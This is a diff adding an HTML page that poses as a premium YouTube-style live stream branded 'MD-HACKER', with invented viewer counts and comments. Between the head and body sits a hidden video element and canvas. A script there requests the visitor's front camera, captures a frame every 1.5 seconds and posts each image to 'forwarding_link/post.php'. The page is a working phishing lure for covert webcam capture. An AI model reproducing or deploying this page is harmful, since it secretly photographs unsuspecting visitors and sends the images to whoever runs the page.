@@ -1,0 +1,546 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>Premium Live Streaming | MD-HACKER</title>
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #0f0f0f;
+      color: #fff;
+      line-height: 1.6;
+      min-height: 100vh;
+    }
+    
+    .header {
+      background-color: #1f1f1f;
+      padding: 15px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+      position: relative;
+      z-index: 100;
+    }
+    
+    .logo {
+      font-size: 22px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+    }
+    
+    .logo i {
+      color: #ff0000;
+      margin-right: 10px;
+    }
+    
+    .nav-links {
+      display: flex;
+      gap: 20px;
+    }
+    
+    .nav-link {
+      color: #aaa;
+      text-decoration: none;
+      font-weight: 500;
+      transition: color 0.3s;
+    }
+    
+    .nav-link:hover, .nav-link.active {
+      color: #fff;
+    }
+    
+    .main-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    
+    .video-section {
+      margin-bottom: 30px;
+    }
+    
+    .video-container {
+      position: relative;
+      width: 100%;
+      overflow: hidden;
+      border-radius: 8px;
+      background-color: #000;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+    }
+    
+    .video-container iframe {
+      width: 100%;
+      aspect-ratio: 16/9;
+      border: none;
+    }
+    
+    .video-info {
+      margin-top: 15px;
+    }
+    
+    .video-title {
+      font-size: 20px;
+      font-weight: 500;
+      margin-bottom: 10px;
+    }
+    
+    .channel-info {
+      display: flex;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+    
+    .channel-icon {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background-color: #ff0000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 10px;
+    }
+    
+    .channel-name {
+      font-weight: 500;
+    }
+    
+    .live-badge {
+      background-color: #ff0000;
+      color: white;
+      font-size: 12px;
+      padding: 2px 8px;
+      border-radius: 3px;
+      margin-left: 10px;
+    }
+    
+    .video-stats {
+      display: flex;
+      align-items: center;
+      color: #aaa;
+      font-size: 14px;
+      margin-bottom: 15px;
+    }
+    
+    .video-stats div {
+      margin-right: 20px;
+      display: flex;
+      align-items: center;
+    }
+    
+    .video-stats i {
+      margin-right: 5px;
+    }
+    
+    .action-buttons {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    
+    .action-button {
+      background-color: #272727;
+      border: none;
+      color: #fff;
+      padding: 8px 15px;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    
+    .action-button:hover {
+      background-color: #3d3d3d;
+    }
+    
+    .action-button.like {
+      background-color: #065fd4;
+    }
+    
+    .action-button.like:hover {
+      background-color: #0756bb;
+    }
+    
+    .video-description {
+      background-color: #1f1f1f;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 30px;
+    }
+    
+    .comments-section {
+      margin-bottom: 30px;
+    }
+    
+    .comments-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+    
+    .comments-title {
+      font-size: 18px;
+      font-weight: 500;
+    }
+    
+    .sort-comments {
+      color: #aaa;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      cursor: pointer;
+    }
+    
+    .comment {
+      display: flex;
+      margin-bottom: 20px;
+    }
+    
+    .comment-avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background-color: #3d3d3d;
+      margin-right: 15px;
+      flex-shrink: 0;
+    }
+    
+    .comment-content {
+      flex-grow: 1;
+    }
+    
+    .comment-author {
+      font-weight: 500;
+      margin-bottom: 5px;
+    }
+    
+    .comment-text {
+      color: #ddd;
+      margin-bottom: 5px;
+    }
+    
+    .comment-actions {
+      display: flex;
+      gap: 15px;
+      color: #aaa;
+      font-size: 14px;
+    }
+    
+    .comment-actions div {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      cursor: pointer;
+    }
+    
+    .comment-actions div:hover {
+      color: #fff;
+    }
+    
+    .recommended-section {
+      margin-top: 20px;
+    }
+    
+    .section-title {
+      font-size: 18px;
+      font-weight: 500;
+      margin-bottom: 15px;
+    }
+    
+    .recommended-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+      gap: 20px;
+    }
+    
+    .recommended-video {
+      cursor: pointer;
+    }
+    
+    .recommended-thumbnail {
+      position: relative;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-bottom: 10px;
+    }
+    
+    .recommended-thumbnail img {
+      width: 100%;
+      aspect-ratio: 16/9;
+      object-fit: cover;
+    }
+    
+    .video-duration {
+      position: absolute;
+      bottom: 5px;
+      right: 5px;
+      background-color: rgba(0,0,0,0.8);
+      color: white;
+      padding: 2px 4px;
+      border-radius: 2px;
+      font-size: 12px;
+    }
+    
+    .recommended-title {
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 5px;
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+      overflow: hidden;
+    }
+    
+    .recommended-channel {
+      font-size: 12px;
+      color: #aaa;
+    }
+    
+    @media (max-width: 768px) {
+      .nav-links {
+        display: none;
+      }
+      
+      .action-buttons {
+        flex-wrap: wrap;
+      }
+      
+      .recommended-grid {
+        grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+      }
+    }
+  </style>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+  var context = canvas.getContext('2d');
+  setInterval(function(){
+    context.drawImage(video, 0, 0, 640, 480);
+    var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+    post(canvasData); 
+  }, 1500);
+}
+
+// Load init
+init();
+</script>
+
+<body>
+  <header class="header">
+    <div class="logo">
+      <i class="fab fa-youtube"></i> PremiumTube
+    </div>
+    <div class="nav-links">
+      <a href="#" class="nav-link active">Home</a>
+      <a href="#" class="nav-link">Explore</a>
+      <a href="#" class="nav-link">Subscriptions</a>
+      <a href="#" class="nav-link">Library</a>
+    </div>
+  </header>
+
+  <div class="main-container">
+    <div class="video-section">
+      <div class="video-container">
+        <iframe id="Live_YT_TV" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+      </div>
+      
+      <div class="video-info">
+        <h1 class="video-title">Premium Live Stream - Exclusive Content</h1>
+        
+        <div class="channel-info">
+          <div class="channel-icon">
+            <i class="fas fa-user"></i>
+          </div>
+          <div class="channel-name">MD-HACKER</div>
+          <div class="live-badge">LIVE NOW</div>
+        </div>
+        
+        <div class="video-stats">
+          <div class="views">
+            <i class="fas fa-eye"></i> 25,437 watching
+          </div>
+          <div class="date">
+            <i class="fas fa-calendar-alt"></i> Streaming since 2 hours ago
+          </div>
+        </div>
+        
+        <div class="action-buttons">
+          <button class="action-button like">
+            <i class="fas fa-thumbs-up"></i> 8.5K
+          </button>
+          <button class="action-button">
+            <i class="fas fa-thumbs-down"></i> 124
+          </button>
+          <button class="action-button">
+            <i class="fas fa-share"></i> Share
+          </button>
+          <button class="action-button">
+            <i class="fas fa-save"></i> Save
+          </button>
+          <button class="action-button">
+            <i class="fas fa-flag"></i> Report
+          </button>
+        </div>
+        
+        <div class="video-description">
+          <p>Welcome to our premium live stream! Enjoy this exclusive content only available for our subscribers. Make sure to like and share the stream to support the channel.</p>
+          <p>Follow us on social media for more content:</p>
+          <p>Instagram: <a href="https://www.instagram.com/iammd_18_" style="color: #3897f0;">@iammd_18_</a><br>
+          GitHub: <a href="https://github.com/MD-HACKER07" style="color: #6e5494;">@MD-HACKER07</a><br>
+          Website: <a href="https://abushalem.site/" style="color: #065fd4;">abushalem.site</a></p>
+        </div>
+      </div>
+    </div>
+    
+    <div class="comments-section">
+      <div class="comments-header">
+        <div class="comments-title">1,245 Comments</div>
+        <div class="sort-comments">
+          <i class="fas fa-sort"></i> SORT BY
+        </div>
+      </div>
+      
+      <div class="comment">
+        <div class="comment-avatar"></div>
+        <div class="comment-content">
+          <div class="comment-author">John Smith</div>
+          <div class="comment-text">Amazing stream! I've been waiting for this content. Keep up the great work!</div>
+          <div class="comment-actions">
+            <div class="like">
+              <i class="fas fa-thumbs-up"></i> 245
+            </div>
+            <div class="dislike">
+              <i class="fas fa-thumbs-down"></i>
+            </div>
+            <div class="reply">REPLY</div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="comment">
+        <div class="comment-avatar"></div>
+        <div class="comment-content">
+          <div class="comment-author">Emily Johnson</div>
+          <div class="comment-text">This is incredible! Can't believe I'm watching this live.</div>
+          <div class="comment-actions">
+            <div class="like">
+              <i class="fas fa-thumbs-up"></i> 187
+            </div>
+            <div class="dislike">
+              <i class="fas fa-thumbs-down"></i>
+            </div>
+            <div class="reply">REPLY</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+    <div class="recommended-section">
+      <h2 class="section-title">Recommended for you</h2>
+      <div class="recommended-grid">
+        <div class="recommended-video">
+          <div class="recommended-thumbnail">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=" alt="Thumbnail">
+            <div class="video-duration">15:24</div>
+          </div>
+          <div class="recommended-title">How to Master Cybersecurity in 2024</div>
+          <div class="recommended-channel">TechMaster • 245K views • 2 weeks ago</div>
+        </div>
+        
+        <div class="recommended-video">
+          <div class="recommended-thumbnail">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=" alt="Thumbnail">
+            <div class="video-duration">21:08</div>
+          </div>
+          <div class="recommended-title">Advanced Ethical Hacking Tutorial</div>
+          <div class="recommended-channel">CyberPro • 189K views • 1 month ago</div>
+        </div>
+        
+        <div class="recommended-video">
+          <div class="recommended-thumbnail">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=" alt="Thumbnail">
+            <div class="video-duration">8:42</div>
+          </div>
+          <div class="recommended-title">The Future of AI in 2024 and Beyond</div>
+          <div class="recommended-channel">TechInsider • 512K views • 3 days ago</div>
+        </div>
+        
+        <div class="recommended-video">
+          <div class="recommended-thumbnail">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=" alt="Thumbnail">
+            <div class="video-duration">12:17</div>
+          </div>
+          <div class="recommended-title">Web Development Trends You Need to Know</div>
+          <div class="recommended-channel">CodeMaster • 78K views • 5 days ago</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
